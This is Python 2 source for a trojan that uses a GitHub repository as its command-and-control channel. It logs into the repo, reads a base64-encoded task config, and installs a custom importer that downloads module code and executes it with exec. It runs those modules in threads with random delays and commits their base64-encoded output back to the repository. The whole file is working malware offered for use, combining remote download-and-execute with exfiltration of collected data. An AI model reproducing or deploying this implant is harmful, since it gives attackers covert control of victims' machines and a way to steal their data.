import Queue
from github3 import login
import json
import base64
import sys
import random
import imp # This module provides the components needed to build your own __import__ function.
import threading
import time

trojan_id = "abc"

trojan_config = "config/%s.json" % trojan_id
data_path = "data/%s/" % trojan_id
trojan_modules = []
configured = False
task_queue = Queue.Queue()


def connect_to_github(usr, pssword):
    gh = login(username=usr,password=pssword)
    repo = gh.repository(usr, "goingBlack")
    branch = repo.branch("trojanmaster") # test with a separate branch, not master

    return gh, repo, branch

def get_file_contents(filepath):
    gh,repo,branch = connect_to_github(None, None)
    tree = branch.commit.commit.tree.recurse()

    for filename in tree.tree:
        if filepath in filename.path:
            print "[*] Found file %s" % filepath
            blob = repo.blob(filename._json_data['sha'])
            return blob.content # get the first match found
    return None


def get_trojan_config():
    global configured
    config_json = get_file_contents(trojan_config)
    config = json.loads(base64.b64decode(config_json))
    configured = True

    for task in config:
        if task['module'] not in sys.modules: # mande?
            exec("import %s" % task['module'])

    return config


def store_module_result(data):
    gh,repo,branch = connect_to_github(None, None)
    remote_path = "data/%s/%d.data" % (trojan_id, random.randint(1000,100000))
    repo.create_file(remote_path, "Commit message", base64.b64encode(data))
    return


# every time the interpreter attempts to load a module that isnt available our gitImporter class is used
class GitImporter(object):
    def __init__(self):
        self.current_module_code = ""


    def find_module(self,fullname, path=None):
        if configured:
            print "[*] Attempting to retrieve %s" % fullname
            new_library = get_file_contents("modules/%s" % fullname)

            if new_library is not None:
                self.current_module_code = base64.b64decode(new_library)
                return self
        return None

    def load_module(self,name):
        module = imp.new_module(name) # create new blank module object
        exec self.current_module_code in module.__dict__ # shovel the code we just retrieved into it
        sys.modules[name] = module # insert into sys.modules so it's picked up by future import calls

        return module

def module_runner(module):
    task_queue.put(1)
    result = sys.modules[module].run()
    task_queue.get()

    # store the result in our repo
    store_module_result(result)

    return


# main trojan loop
# we first make sure to add the custom module importer!!
sys.meta_path = [GitImporter()]

while True:
    # grab configuration
    if task_queue.empty():
        config = get_trojan_config()

    for task in config:
        t = threading.Thread(target=module_runner, args=(task['module'],))
        t.start()
        time.sleep(random.randint(1,10))

time.sleep(random.randint(1000,10000))